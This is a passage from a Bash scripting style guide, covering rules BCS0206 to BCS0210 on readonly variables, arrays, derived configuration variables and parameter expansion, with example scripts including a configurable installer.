#!/bin/bash
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Mutable flags (will be readonly after parsing)
declare -i VERBOSE=0
declare -i DRY_RUN=0

# Mutable configuration (will be readonly after parsing)
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

main() {
  # Parse arguments (modifies VERBOSE, DRY_RUN, etc.)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -c|--config)  noarg "$@"; shift; CONFIG_FILE=$1 ;;
    -l|--log)     noarg "$@"; shift; LOG_FILE=$1 ;;
    *)            die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  # Now make parsed values readonly
  readonly -- VERBOSE DRY_RUN

  # Optional values: only readonly if set
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE
  [[ -z "$LOG_FILE" ]] || readonly -- LOG_FILE

  # Rest of script with readonly variables
  ((VERBOSE)) && info 'Verbose mode enabled' ||:
  ((DRY_RUN)) && info 'Dry-run mode enabled' ||:
}

main "$@"
#fin
```

**Testing readonly status:**

```bash
# Check if variable is readonly
if readonly -p 2>/dev/null | grep -q "VERSION"; then
  echo 'VERSION is readonly'
else
  echo 'VERSION is not readonly'
fi

# List all readonly variables
readonly -p

# Attempt to modify readonly variable (for testing)
VERSION=2.0.0  # Will fail: bash: VERSION: readonly variable
```

**When NOT to use readonly:**

```bash
# Don't make readonly if value will change during script execution
declare -i count=0
# count is modified in loops - don't make readonly

# Don't make readonly if conditional assignment
config_file=''
if [[ -f custom.conf ]]; then
  config_file=custom.conf
elif [[ -f default.conf ]]; then
  config_file=default.conf
fi
# config_file might be modified - don't make readonly yet

# Only make readonly when value is final
[[ -z "$config_file" ]] || readonly -- config_file
```

**Summary:**

- **Initialize first, readonly second**: Separate value assignment from protection
- **Group related variables**: Make logically related variables readonly together
- **Use visual separation**: Add blank lines or comments between variable groups
- **Always use `--`**: Prevents option injection bugs
- **Make readonly early**: As soon as values are final and won't change
- **Delayed readonly for args**: Make readonly after argument parsing for flags/options
- **Test readonly status**: Use `readonly -p` to verify

**Key principle:** The "readonly after group" pattern makes immutability contracts explicit and visible. By clearly separating initialization from protection, readers immediately understand which variables are constants and which are mutable.


---


**Rule: BCS0206**

## Readonly Declaration
Use `declare -r` or `readonly` for constants to prevent accidental modification.

```bash
declare -ra REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
declare -r SCRIPT_PATH=$(realpath -- "$0")
```


---


**Rule: BCS0207**

### Arrays

**Rule: BCS0207**

Array declaration, usage, and safe list handling.

---

#### Rationale

Arrays provide:
- **Element preservation**: Boundaries maintained regardless of content
- **No word splitting**: `"${array[@]}"` preserves elements exactly
- **Glob safety**: Wildcards in elements are preserved literally
- **Safe command construction**: Build commands with arbitrary arguments

---

#### Declaration

```bash
# Indexed arrays (explicit declaration)
declare -a paths=()           # Empty array
declare -a colors=(red green blue)

# Local arrays in functions
local -a found_files=()

# Associative arrays (Bash 4.0+)
declare -A config=()
config['key']='value'
```

#### Adding Elements

```bash
# Append single element
paths+=("$1")

# Append multiple elements
args+=("$arg1" "$arg2" "$arg3")

# Append another array
all_files+=("${config_files[@]}")
all_files+=("$@")
```

#### Iteration

```bash
# ✓ Correct - quoted expansion, handles spaces
for path in "${paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${paths[@]}; do
  process "$path"
done
```

#### Length and Checking

```bash
# Get number of elements
count=${#files[@]}

# Check if empty
if ((${#array[@]} == 0)); then
  info 'Array is empty'
fi

# Set default if empty
((${#paths[@]})) || paths=('.')
```

#### Reading Into Arrays

```bash
# Split string by delimiter
IFS=',' read -ra fields <<< "$csv_line"

# From command output (preferred)
readarray -t lines < <(grep pattern file)
mapfile -t files < <(find . -name "*.txt")

# From file
readarray -t config_lines < config.txt
```

#### Element Access

```bash
# Single element (0-indexed)
first=${array[0]}
last=${array[-1]}           # Bash 4.3+

# All elements
"${array[@]}"               # Each as separate word
"${array[*]}"               # All as single word (rare)

# Slice
"${array[@]:2}"             # From index 2
"${array[@]:1:3}"           # 3 elements from index 1
```

---

#### Safe Command Construction

```bash
# Build command with variable arguments
local -a cmd=(myapp --config "$config_file")

# Add conditional arguments
((verbose)) && cmd+=(--verbose) ||:
[[ -z "$output" ]] || cmd+=(--output "$output")

# Execute safely
"${cmd[@]}"
```

#### Collecting Arguments During Parsing

```bash
declare -a input_files=()
while (($#)); do
  case $1 in
    -*)  handle_option "$1" ;;
    *)   input_files+=("$1") ;;
  esac
  shift
done

# Process collected files
for file in "${input_files[@]}"; do
  process_file "$file"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted expansion
rm ${files[@]}

# ✓ Correct - quoted expansion
rm "${files[@]}"
```

```bash
# ✗ Wrong - word splitting to create array
array=($string)

# ✓ Correct - explicit
readarray -t array <<< "$string"
```

```bash
# ✗ Wrong - using [*] in iteration
for item in "${array[*]}"; do

# ✓ Correct - use [@]
for item in "${array[@]}"; do
```

---

#### Operator Summary

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.


---


**Rule: BCS0208**

### Reserved for Future Use

**Rule: BCS0208**

---

This rule code is reserved for future expansion of the Variables & Data Types section.

#### Purpose

This placeholder exists to:

1. **Maintain numerical sequence integrity** - Ensures BCS codes follow consistent two-digit patterns
2. **Allow future additions** - Provides space for variable-related topics without code renumbering
3. **Prevent external conflicts** - Protects any external references to BCS0208

#### Possible Future Topics

- Nameref variables (`declare -n`)
- Indirect variable expansion (`${!var}`)
- Variable attributes and introspection
- Typed variable best practices

#### Note

Do not use BCS0208 in documentation or compliance checking until this placeholder is replaced with actual content.

---

**Status:** Reserved
**Version:** 1.0.0


---


**Rule: BCS0209**

## Derived Variables

**Derived variables are variables computed from other variables, often for paths, configurations, or composite values. Group derived variables together with clear section comments explaining their dependencies. Document special cases or hardcoded values. When base variables can change (especially during argument parsing), remember to update all derived variables. Derived variables reduce duplication and ensure consistency when base values change.**

**Rationale:**

- **DRY Principle**: Single source of truth for base values, derived everywhere else
- **Consistency**: When PREFIX changes, all paths update automatically
- **Maintainability**: One place to change base value, derivations update automatically
- **Clarity**: Section comments make relationships between variables obvious
- **Flexibility**: Easy to customize base values via arguments or environment
- **Documentation**: Explicit derivation shows intent and dependencies
- **Correctness**: Updating derived variables when base changes prevents subtle bugs

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME"/."$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- CACHE_DIR="$HOME"/.cache/"$APP_NAME"
declare -- DATA_DIR="$HOME"/.local/share/"$APP_NAME"

main() {
  echo "Installation prefix: $PREFIX"
  echo "Binaries: $BIN_DIR"
  echo "Libraries: $LIB_DIR"
  echo "Documentation: $DOC_DIR"
}

main "$@"
#fin
```

**Derived paths with environment fallbacks:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived from Environment (XDG Base Directory Specification)
# ============================================================================

# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- DATA_DIR="$DATA_BASE"/"$APP_NAME"

# XDG_STATE_HOME with fallback to $HOME/.local/state (for logs)
declare -- STATE_BASE=${XDG_STATE_HOME:-"$HOME"/.local/state}
declare -- LOG_DIR="$STATE_BASE"/"$APP_NAME"
declare -- LOG_FILE="$LOG_DIR"/app.log

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- CACHE_DIR="$CACHE_BASE"/"$APP_NAME"

main() {
  echo "Configuration: $CONFIG_DIR"
  echo "Data: $DATA_DIR"
  echo "Logs: $LOG_DIR"
  echo "Cache: $CACHE_DIR"
}

main "$@"
#fin
```

**Updating derived variables when base changes:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths (initial values)
# ============================================================================

declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- MAN_DIR="$PREFIX"/share/man
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
  MAN_DIR="$PREFIX"/share/man
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

  info "Updated paths for PREFIX=${PREFIX@Q}"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX=$1
        # IMPORTANT: Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME=$1
        # DOC_DIR depends on APP_NAME, update it
        DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"
        ;;

      -h|--help)
        echo "Usage: $SCRIPT_NAME [--prefix PREFIX] [--app-name NAME]"
        return 0
        ;;

      *)
        die 22 "Invalid argument ${1@Q}"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR

  # Display configuration
  info 'Installation Configuration:'
  info "  Prefix: $PREFIX"
  info "  App Name: $APP_NAME"
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Documentation: $DOC_DIR"
  info "  Manual Pages: $MAN_DIR"
}

main "$@"
#fin
```

**Complex derivations with multiple dependencies:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- ENVIRONMENT=production
declare -- REGION=us-east
declare -- APP_NAME=myapp
declare -- NAMESPACE=default

# ============================================================================
# Configuration - Derived Identifiers
# ============================================================================

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- RESOURCE_PREFIX="$NAMESPACE-$APP_NAME"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# Paths that depend on environment
declare -- CONFIG_DIR=/etc/"$APP_NAME"/"$ENVIRONMENT"
declare -- LOG_DIR=/var/log/"$APP_NAME"/"$ENVIRONMENT"
declare -- DATA_DIR=/var/lib/"$APP_NAME"/"$ENVIRONMENT"

# Files derived from directories and identifiers
declare -- CONFIG_FILE="$CONFIG_DIR"/config-"$REGION".conf
declare -- LOG_FILE="$LOG_DIR"/"$APP_NAME"-"$REGION".log
declare -- PID_FILE=/var/run/"$DEPLOYMENT_ID".pid

# ============================================================================
# Configuration - Derived URLs
# ============================================================================

declare -- API_HOST=api-"$ENVIRONMENT".example.com
declare -- API_URL="https://$API_HOST/v1"
declare -- METRICS_URL="https://metrics-$REGION.example.com/$APP_NAME"

main() {
  info 'Deployment Configuration:'
  info "  Deployment ID: $DEPLOYMENT_ID"
  info "  Resource Prefix: $RESOURCE_PREFIX"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  API URL: $API_URL"
  info "  Metrics URL: $METRICS_URL"
}

main "$@"
#fin
```

**Complete example - Configurable installation script:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables - Base Values
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp
declare -- SYSTEM_USER=myapp

# ============================================================================
# Global Variables - Derived Installation Paths
# ============================================================================

# Installation directories derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib/"$APP_NAME"
declare -- SHARE_DIR="$PREFIX"/share/"$APP_NAME"
declare -- MAN_DIR="$PREFIX"/share/man/man1
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# System directories derived from APP_NAME
declare -- CONFIG_DIR=/etc/"$APP_NAME"
declare -- LOG_DIR=/var/log/"$APP_NAME"
declare -- DATA_DIR=/var/lib/"$APP_NAME"
declare -- RUN_DIR=/var/run/"$APP_NAME"

# Files derived from directories
declare -- MAIN_BINARY="$BIN_DIR"/"$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- LOG_FILE="$LOG_DIR"/app.log
declare -- PID_FILE="$RUN_DIR"/"$APP_NAME".pid

# Systemd unit file path (hardcoded - doesn't depend on PREFIX)
declare -- SYSTEMD_DIR=/etc/systemd/system
declare -- SERVICE_FILE="$SYSTEMD_DIR"/"$APP_NAME".service

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  debug 'Updating derived paths...'

  # Derived from PREFIX
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib/"$APP_NAME"
  SHARE_DIR="$PREFIX"/share/"$APP_NAME"
  MAN_DIR="$PREFIX"/share/man/man1
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

  # Derived from APP_NAME (PREFIX-independent)
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
  DATA_DIR=/var/lib/"$APP_NAME"
  RUN_DIR=/var/run/"$APP_NAME"

  # Derived from directories
  MAIN_BINARY="$BIN_DIR"/"$APP_NAME"
  CONFIG_FILE="$CONFIG_DIR"/config.conf
  LOG_FILE="$LOG_DIR"/app.log
  PID_FILE="$RUN_DIR"/"$APP_NAME".pid
  SERVICE_FILE="$SYSTEMD_DIR"/"$APP_NAME".service

  debug "PREFIX: $PREFIX"
  debug "BIN_DIR: $BIN_DIR"
  debug "CONFIG_DIR: $CONFIG_DIR"
}

# ============================================================================
# Installation Functions
# ============================================================================

# Show installation configuration
show_config() {
  info "$APP_NAME v$VERSION Installation Configuration:"
  echo ''
  info 'Installation Prefix:'
  info "  PREFIX: $PREFIX"
  echo ''
  info 'Binary and Library Paths:'
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Shared Files: $SHARE_DIR"
  info "  Manual Pages: $MAN_DIR"
  info "  Documentation: $DOC_DIR"
  echo ''
  info 'System Paths:'
  info "  Configuration: $CONFIG_DIR"
  info "  Logs: $LOG_DIR"
  info "  Data: $DATA_DIR"
  info "  Runtime: $RUN_DIR"
  echo ''
  info 'Key Files:'
  info "  Main Binary: $MAIN_BINARY"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  PID File: $PID_FILE"
  info "  Service File: $SERVICE_FILE"
  echo ''
  info 'System User:'
  info "  User: $SYSTEM_USER"
}

# Create installation directories
create_directories() {
  local -a directories=(
    "$BIN_DIR"
    "$LIB_DIR"
    "$SHARE_DIR"
    "$MAN_DIR"
    "$DOC_DIR"
    "$CONFIG_DIR"
    "$LOG_DIR"
    "$DATA_DIR"
    "$RUN_DIR"
  )

  local -- dir
  for dir in "${directories[@]}"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory ${dir@Q}"
    else
      if [[ ! -d "$dir" ]]; then
        debug "Creating directory ${dir@Q}"
        mkdir -p "$dir"
      else
        debug "Directory exists ${dir@Q}"
      fi
    fi
  done
}

# Install files
install_files() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install files to:'
    info "  Binary: $MAIN_BINARY"
    info "  Config: $CONFIG_FILE"
    info "  Service: $SERVICE_FILE"
  else
    info 'Installing files...'

    # Install binary
    debug "Installing binary to: $MAIN_BINARY"
    install -m 755 "$SCRIPT_DIR"/bin/"$APP_NAME" "$MAIN_BINARY"

    # Install config
    if [[ ! -f "$CONFIG_FILE" ]]; then
      debug "Installing config to: $CONFIG_FILE"
      install -m 644 "$SCRIPT_DIR"/config/config.conf "$CONFIG_FILE"
    else
      debug "Config exists, skipping ${CONFIG_FILE@Q}"
    fi

    # Install systemd service
    debug "Installing service to ${SERVICE_FILE@Q}"
    install -m 644 "$SCRIPT_DIR"/systemd/"$APP_NAME".service "$SERVICE_FILE"

    success 'Files installed successfully'
  fi
}

# ============================================================================
# Main Function
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Install myapp

Install myapp with configurable paths.

Usage: install.sh [OPTIONS]

Options:
  -v, --verbose           Verbose output (additive: -vv == debug)                     Very verbose (debug) output
  --prefix PREFIX         Installation prefix (default: /usr/local)
  --app-name NAME         Application name (default: myapp)
  --system-user USER      System user (default: myapp)
  -h, --help              Show this help message
  -V, --version           Show version

Examples:
  $SCRIPT_NAME
  $SCRIPT_NAME --prefix /opt/myapp
  $SCRIPT_NAME --dry-run --verbose
  $SCRIPT_NAME --prefix /usr --system-user webapp
HELP
}

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      --prefix)
        noarg "$@"
        shift
        PREFIX=$1
        # Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME=$1
        # Update paths that depend on APP_NAME
        update_derived_paths
        ;;

      --system-user)
        noarg "$@"
        shift
        SYSTEM_USER=$1
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        die 22 "Unexpected argument ${1@Q}"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR
  readonly -- CONFIG_DIR LOG_DIR DATA_DIR RUN_DIR SYSTEMD_DIR
  readonly -- MAIN_BINARY CONFIG_FILE LOG_FILE PID_FILE SERVICE_FILE

  # Check for root if not dry-run
  if ((DRY_RUN == 0)) && ((EUID)); then
    die 1 'This script must be run as root (or use --dry-run to preview)'
  fi

  # Show configuration
  show_config

  # Create directories
  info 'Creating directories...'
  create_directories

  # Install files
  install_files

  # Success
  ((DRY_RUN)) && info '[DRY-RUN] Installation preview complete' ||:
  ((DRY_RUN)) || success "$APP_NAME $VERSION installed successfully!"
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - duplicating values instead of deriving
PREFIX=/usr/local
BIN_DIR=/usr/local/bin        # Duplicates PREFIX!
LIB_DIR=/usr/local/lib        # Duplicates PREFIX!

# ✓ Correct - derive from base value
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin           # Derived from PREFIX
LIB_DIR="$PREFIX"/lib           # Derived from PREFIX

# ✗ Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      shift
      PREFIX=$1
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

# ✓ Correct - update derived variables
main() {
  case $1 in
    --prefix)
      shift
      PREFIX=$1
      BIN_DIR="$PREFIX"/bin     # Update derived
      LIB_DIR="$PREFIX"/lib     # Update derived
      ;;
  esac
}

# ✗ Wrong - no comments explaining derivation
CONFIG_DIR="$HOME"/.config/"$APP_NAME"
DATA_DIR="$HOME"/.local/share/"$APP_NAME"
CACHE_DIR="$HOME"/.cache/"$APP_NAME"

# ✓ Correct - section comment explaining derivation
# Derived from $HOME and $APP_NAME
CONFIG_DIR="$HOME"/.config/"$APP_NAME"
DATA_DIR="$HOME"/.local/share/"$APP_NAME"
CACHE_DIR="$HOME"/.cache/"$APP_NAME"

# ✗ Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX"/bin
readonly -- BIN_DIR             # Can't update if PREFIX changes!
PREFIX=/usr/local

# ✓ Correct - make readonly after all values set
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR      # Now make readonly

# ✗ Wrong - complex derivation without comments
DEPLOYMENT="$ENV"-"$REGION"-"$APP"-"$VERSION"-"$COMMIT"

# ✓ Correct - explain complex derivation
# Deployment ID format: environment-region-app-version-commit
DEPLOYMENT="$ENV"-"$REGION"-"$APP"-"$VERSION"-"$COMMIT"

# ✗ Wrong - inconsistent derivation
CONFIG_DIR=/etc/myapp                  # Hardcoded
LOG_DIR=/var/log/"$APP_NAME"             # Derived from APP_NAME
# Inconsistent - either both derived or both hardcoded!

# ✓ Correct - consistent derivation
CONFIG_DIR=/etc/"$APP_NAME"              # Derived
LOG_DIR=/var/log/"$APP_NAME"             # Derived

# ✗ Wrong - circular dependency
VAR1="$VAR2"
VAR2="$VAR1"                             # Circular!

# ✓ Correct - clear dependency chain
BASE='value'
DERIVED1="$BASE"/path1
DERIVED2="$BASE"/path2

# ✗ Wrong - hardcoding derived value that should be flexible
APP_NAME=myapp
CONFIG_FILE=/etc/myapp/config.conf     # Hardcoded!

# ✓ Correct - derive from APP_NAME
APP_NAME=myapp
CONFIG_DIR=/etc/"$APP_NAME"
CONFIG_FILE="$CONFIG_DIR"/config.conf    # Derived
```

**Edge cases:**

**1. Environment variable fallbacks:**

```bash
# XDG Base Directory support with fallbacks
CONFIG_BASE=${XDG_CONFIG_HOME:-"$HOME"/.config}
DATA_BASE=${XDG_DATA_HOME:-"$HOME"/.local/share}
CACHE_BASE=${XDG_CACHE_HOME:-"$HOME"/.cache}
STATE_BASE=${XDG_STATE_HOME:-"$HOME"/.local/state}

# Derived from environment-aware bases
CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"
DATA_DIR="$DATA_BASE"/"$APP_NAME"
CACHE_DIR="$CACHE_BASE"/"$APP_NAME"
LOG_DIR="$STATE_BASE"/"$APP_NAME"
```

**2. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == development ]]; then
  CONFIG_DIR="$SCRIPT_DIR"/config
  LOG_DIR="$SCRIPT_DIR"/logs
else
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR"/config.conf
LOG_FILE="$LOG_DIR"/app.log
```

**3. Platform-specific derivations:**

```bash
# Detect platform
case "$(uname -s)" in
  Darwin)
    LIB_EXT=dylib
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT=so
    CONFIG_DIR="$HOME"/.config/"$APP_NAME"
    ;;
  *)
    die 1 'Unsupported platform'
    ;;
esac

# Derived from platform-specific values
LIBRARY_NAME="lib"$APP_NAME"."$LIB_EXT"
CONFIG_FILE="$CONFIG_DIR"/config.conf
```

**4. Hardcoded exceptions:**

```bash
# Most paths derived from PREFIX
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
LIB_DIR="$PREFIX"/lib

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR=/etc/profile.d           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR"/"$APP_NAME".sh
```

**5. Multiple update functions:**

```bash
# Update subset of derived variables
update_prefix_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
}

update_app_paths() {
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
  DATA_DIR=/var/lib/"$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths

  # Files derived from directories
  CONFIG_FILE="$CONFIG_DIR"/config.conf
  LOG_FILE="$LOG_DIR"/app.log
}
```

**Summary:**

- **Group derived variables** - with section comments explaining dependencies
- **Derive from base values** - never duplicate, always compute
- **Update when base changes** - especially during argument parsing
- **Document special cases** - explain hardcoded values that don't derive
- **Consistent derivation** - if one path derives from APP_NAME, all should
- **Environment fallbacks** - use `${XDG_VAR:-$HOME/default}` pattern
- **Make readonly last** - after all parsing and derivation complete
- **Clear dependency chain** - base → derived1 → derived2
- **Section comments** - "# Derived from PREFIX" or "# Derived paths"
- **Update functions** - centralize derivation logic when many variables

**Key principle:** Derived variables implement the DRY (Don't Repeat Yourself) principle at the configuration level. Define each piece of information once (the base value), then derive everything else from it. This ensures consistency when base values change and makes scripts more maintainable. Always group derived variables with explanatory comments, and remember to update them when base variables change during execution. The mental model is simple: base values are inputs, derived variables are computed outputs.


---


**Rule: BCS0210**

### Parameter Expansion & Braces Usage

**Rule: BCS0210** (Merged from BCS0301 + BCS0302)

Variable expansion operations and when to use braces.

---

#### General Rule

Always quote variables with `"$var"` as the default form. Only use braces `"${var}"` when syntactically necessary.

**Rationale:** Braces add visual noise without providing value when not required. Using them only when necessary makes code cleaner and the necessary cases stand out.

---

#### Parameter Expansion Operations

```bash
# Pattern removal
SCRIPT_NAME=${SCRIPT_PATH##*/}  # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}    # Remove shortest suffix pattern

# Default values
${var:-default}                 # Use default if unset or null
${var:=default}                 # Set default if unset or null
${var:+alternate}               # Use alternate if set and non-null

# Substrings
${var:0:5}                      # First 5 characters
${var:(-3)}                     # Last 3 characters

# Pattern substitution
${var//old/new}                 # Replace all occurrences
${var/old/new}                  # Replace first occurrence
${var/#pattern/replace}         # Replace prefix
${var/%pattern/replace}         # Replace suffix

# Case conversion (Bash 4.0+)
${var,,}                        # All lowercase
${var^^}                        # All uppercase
${var~}                         # Toggle first char
${var~~}                        # Toggle all chars

# Special parameters
"${@:2}"                        # All args from 2nd onwards
"${10}"                         # Positional param > 9
${#var}                         # String length
${!prefix@}                     # Variables starting with prefix
```

---

#### When Braces Are REQUIRED

1. **Parameter expansion operations:**
   ```bash
